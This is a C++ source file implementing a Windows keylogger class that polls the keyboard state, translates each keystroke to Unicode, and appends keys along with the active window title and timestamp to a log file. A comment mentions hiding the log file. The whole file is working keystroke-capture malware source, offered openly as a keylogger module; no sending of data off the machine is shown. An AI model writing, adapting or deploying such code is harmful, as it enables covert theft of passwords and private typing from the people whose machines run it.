#include "methods/keylogger/KeysRecorder.h"

#include <windows.h>
#include <time.h>

#ifdef _DEBUG
#include <iostream>
#endif // _DEBUG

#include <cstdio>


using namespace methods::keylogger;

KeysRecorder::KeysRecorder(
    std::string file_name)
    : IKeyloggerImplementation(file_name)
{
    InitializeTable();

    AppendLog();
}

void
KeysRecorder::KeystrokeSavingRoutine()
noexcept
{
    LogWindowAndTimeOnChange();

    LogKeys();
}

void
KeysRecorder::AppendLog()
noexcept
{
    // Create file if not exists : CREATE_NEW
    // Hide file                 : FILE_ATTRIBUTE_HIDDEN
    unsigned char header[2] = { 0xFF, 0xFE };

    HANDLE hFile = CreateFile(m_fileName.c_str(),
                              FILE_APPEND_DATA,
                              FILE_SHARE_READ,
                              NULL,
                              CREATE_NEW, // Create file if it doesn't already exist
                              FILE_ATTRIBUTE_NORMAL,
                              NULL);
    WriteFile(hFile, header, 2, NULL, NULL);
    CloseHandle(hFile);
}

void
KeysRecorder::RestartLog()
noexcept
{
    remove(m_fileName.c_str());

    AppendLog();
}

/* protected */

void
KeysRecorder::LogWindowAndTimeOnChange()
noexcept
{
    HWND hwnd;

    // Get foreground window
    if ( NULL != (hwnd = GetForegroundWindow()) )
    {
        wchar_t window_title[256];

        // Get FG window's title
        GetWindowTextW(hwnd, window_title, sizeof(window_title));

        // If window changed on local pc
        if ( 0 != wcscmp(window_title, m_lastWindowTitle) )
        {
            // Save window title and time to log
            LogWindowAndTime(window_title);

            // Save last window title
            wcscpy(m_lastWindowTitle, window_title);
        }
    }
}

void
KeysRecorder::LogWindowAndTime(
    wchar_t *window_title)
noexcept
{
    wchar_t time_buffer[512];
    time_t raw_time;
    struct tm *time_info;
    char *ascii_time;

    // Get current time
    time ( &raw_time );
    time_info = localtime ( &raw_time );
    ascii_time = asctime(time_info);
    mbstowcs(time_buffer, ascii_time, strlen(ascii_time)-1);

    // Save time to file
    WriteToFile(L"\n\n");
    WriteToFile(window_title);
    WriteToFile(L"\n");
    WriteToFile(time_buffer);
    WriteToFile(L"\n\n");
}

void
KeysRecorder::LogKeys()
noexcept
{
    // Scan keyboard and save keystrokes
    for (short keystroke = 8; keystroke <= 222; ++keystroke )
    {
        if (GetAsyncKeyState(keystroke) == -32767)
        {
//            if ((keystroke >= 39) && (keystroke < 91))
//            {
            WritesScannedKeyToFile(keystroke);
//            }
//            else
//            {
//                WriteToFile(m_table[keystroke].c_str());
//            }
        }
    }
}

void
KeysRecorder::WritesScannedKeyToFile(
    short keystroke)
noexcept
{
    HKL hkl;
    DWORD dwProcessId;

    HWND hWindowHandle = GetForegroundWindow();
    DWORD dwThreadId = GetWindowThreadProcessId(hWindowHandle, &dwProcessId);
    BYTE *kState = (BYTE*)malloc(256);
    GetKeyboardState(kState);
    hkl = GetKeyboardLayout(dwThreadId);
    wchar_t UniChar[16] = { 0 };
    UINT virtualKey = keystroke;
    ToUnicodeEx(virtualKey, keystroke, (BYTE*)kState, UniChar, 16, 0, hkl);
    WriteToFile(UniChar);
    free(kState);
}

void
KeysRecorder::WriteToFile(
    const wchar_t *text)
noexcept
{
    /* Ignoring errors */

    HANDLE hFile = CreateFile(m_fileName.c_str(),
                              FILE_APPEND_DATA,
                              FILE_SHARE_READ,
                              NULL,
                              OPEN_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL,
                              NULL);
    WriteFile(hFile, text, wcslen(text) * sizeof(wchar_t), NULL, NULL);
    CloseHandle(hFile);
}

/* private */

void
KeysRecorder::InitializeTable()
noexcept
{
    m_table.push_back(L"NULL");
    m_table.push_back(L"LMOUSE");
    m_table.push_back(L"RMOUSE");
    m_table.push_back(L"ETX");
    m_table.push_back(L"EOT");
    m_table.push_back(L"ENQ");
    m_table.push_back(L"ACK");
    m_table.push_back(L"BEL");
    m_table.push_back(L"[BACKSPACE]");
    m_table.push_back(L"[TAB]");
    m_table.push_back(L"LF");
    m_table.push_back(L"VT");
    m_table.push_back(L"FF");
    m_table.push_back(L"\n");
    m_table.push_back(L"SO");
    m_table.push_back(L"SI");
    m_table.push_back(L"[LSHIFT]");
    m_table.push_back(L"[LCTRL]");
    m_table.push_back(L"[LALT]");
    m_table.push_back(L"DC3");
    m_table.push_back(L"[CAPSLOCK]");
    m_table.push_back(L"NAK");
    m_table.push_back(L"SYN");
    m_table.push_back(L"ETB");
    m_table.push_back(L"CAN");
    m_table.push_back(L"EM");
    m_table.push_back(L"SUB");
    m_table.push_back(L"ESC");
    m_table.push_back(L"FS");
    m_table.push_back(L"GS");
    m_table.push_back(L"RS");
    m_table.push_back(L"US");
    m_table.push_back(L" ");
    m_table.push_back(L"!");
    m_table.push_back(L"\"");
    m_table.push_back(L"#");
    m_table.push_back(L"$");
    m_table.push_back(L"%");
    m_table.push_back(L"&");
    m_table.push_back(L"\'");
    m_table.push_back(L"(");
    m_table.push_back(L")");
    m_table.push_back(L"*");
    m_table.push_back(L"+");
    m_table.push_back(L",");
    m_table.push_back(L"-");
    m_table.push_back(L".");
    m_table.push_back(L"/");

    for(unsigned char i = '0'; i <= '9'; ++i)
    {
        m_table.push_back(std::wstring(1, i));
    }

    m_table.push_back(L":");
    m_table.push_back(L";");
    m_table.push_back(L"<");
    m_table.push_back(L"=");
    m_table.push_back(L">");
    m_table.push_back(L"?");
    m_table.push_back(L"@");

    for(unsigned char i = 'A'; i <= 'Z'; ++i)
    {
        m_table.push_back(std::wstring(1, i));
    }

    m_table.push_back(L"[");
    m_table.push_back(L"\\");
    m_table.push_back(L"]");
    m_table.push_back(L"^");
    m_table.push_back(L"_");
    m_table.push_back(L"`");

    for(unsigned char i = 'a'; i <= 'z'; ++i)
    {
        m_table.push_back(std::wstring(1, i));
    }

    m_table.push_back(L"{");
    m_table.push_back(L"|");
    m_table.push_back(L"}");
    m_table.push_back(L"~");
    m_table.push_back(L"DEL");
    m_table.push_back(L"[128]");
    m_table.push_back(L"[129]");
    m_table.push_back(L"[130]");
    m_table.push_back(L"[131]");
    m_table.push_back(L"[132]");
    m_table.push_back(L"[133]");
    m_table.push_back(L"[134]");
    m_table.push_back(L"[135]");
    m_table.push_back(L"[136]");
    m_table.push_back(L"[137]");
    m_table.push_back(L"[138]");
    m_table.push_back(L"[139]");
    m_table.push_back(L"[140]");
    m_table.push_back(L"[141]");
    m_table.push_back(L"[142]");
    m_table.push_back(L"[143]");
    m_table.push_back(L"[144]");
    m_table.push_back(L"[145]");
    m_table.push_back(L"[146]");
    m_table.push_back(L"[147]");
    m_table.push_back(L"[148]");
    m_table.push_back(L"[149]");
    m_table.push_back(L"[150]");
    m_table.push_back(L"[151]");
    m_table.push_back(L"[152]");
    m_table.push_back(L"[153]");
    m_table.push_back(L"[154]");
    m_table.push_back(L"[155]");
    m_table.push_back(L"[156]");
    m_table.push_back(L"[157]");
    m_table.push_back(L"[158]");
    m_table.push_back(L"[159]");
    m_table.push_back(L"");
    m_table.push_back(L"[161]");
    m_table.push_back(L"[LCTRL]");
    m_table.push_back(L"[RCTRL]");
    m_table.push_back(L"");
    m_table.push_back(L"[165]");
    m_table.push_back(L"[166]");
    m_table.push_back(L"[167]");
    m_table.push_back(L"[168]");
    m_table.push_back(L"[169]");
    m_table.push_back(L"[170]");
    m_table.push_back(L"[171]");
    m_table.push_back(L"[172]");
    m_table.push_back(L"[173]");
    m_table.push_back(L"[174]");
    m_table.push_back(L"[175]");
    m_table.push_back(L"[176]");
    m_table.push_back(L"[177]");
    m_table.push_back(L"[178]");
    m_table.push_back(L"[179]");
    m_table.push_back(L"[180]");
    m_table.push_back(L"[181]");
    m_table.push_back(L"[182]");
    m_table.push_back(L"[183]");
    m_table.push_back(L"[184]");
    m_table.push_back(L"[185]");
    m_table.push_back(L"[186]");
    m_table.push_back(L"[187]");
    m_table.push_back(L"[188]");
    m_table.push_back(L"[189]");
    m_table.push_back(L"[180]");
    m_table.push_back(L"[191]");
    m_table.push_back(L"[192]");
    m_table.push_back(L"[193]");
    m_table.push_back(L"[194]");
    m_table.push_back(L"[195]");
    m_table.push_back(L"[196]");
    m_table.push_back(L"[197]");
    m_table.push_back(L"[198]");
    m_table.push_back(L"[199]");
    m_table.push_back(L"[190]");
    m_table.push_back(L"[201]");
    m_table.push_back(L"[202]");
    m_table.push_back(L"[203]");
    m_table.push_back(L"[204]");
    m_table.push_back(L"[205]");
    m_table.push_back(L"[206]");
    m_table.push_back(L"[207]");
    m_table.push_back(L"[208]");
    m_table.push_back(L"[209]");
    m_table.push_back(L"[210]");
    m_table.push_back(L"[211]");
    m_table.push_back(L"[212]");
    m_table.push_back(L"[213]");
    m_table.push_back(L"[214]");
    m_table.push_back(L"[215]");
    m_table.push_back(L"[216]");
    m_table.push_back(L"[217]");
    m_table.push_back(L"[218]");
    m_table.push_back(L"[219]");
    m_table.push_back(L"[220]");
    m_table.push_back(L"[221]");
    m_table.push_back(L"[222]");
    m_table.push_back(L"[223]");
    m_table.push_back(L"[224]");
    m_table.push_back(L"[225]");
    m_table.push_back(L"[226]");
    m_table.push_back(L"[227]");
    m_table.push_back(L"[228]");
    m_table.push_back(L"[229]");
    m_table.push_back(L"[230]");
    m_table.push_back(L"[231]");
    m_table.push_back(L"[232]");
    m_table.push_back(L"[233]");
    m_table.push_back(L"[234]");
    m_table.push_back(L"[235]");
    m_table.push_back(L"[236]");
    m_table.push_back(L"[237]");
    m_table.push_back(L"[238]");
    m_table.push_back(L"[239]");
    m_table.push_back(L"[240]");
    m_table.push_back(L"[241]");
    m_table.push_back(L"[242]");
    m_table.push_back(L"[243]");
    m_table.push_back(L"[244]");
    m_table.push_back(L"[245]");
    m_table.push_back(L"[246]");
    m_table.push_back(L"[247]");
    m_table.push_back(L"[248]");
    m_table.push_back(L"[249]");
    m_table.push_back(L"[250]");
    m_table.push_back(L"[251]");
    m_table.push_back(L"[252]");
    m_table.push_back(L"[253]");
    m_table.push_back(L"[254]");
    m_table.push_back(L"[255]");
}
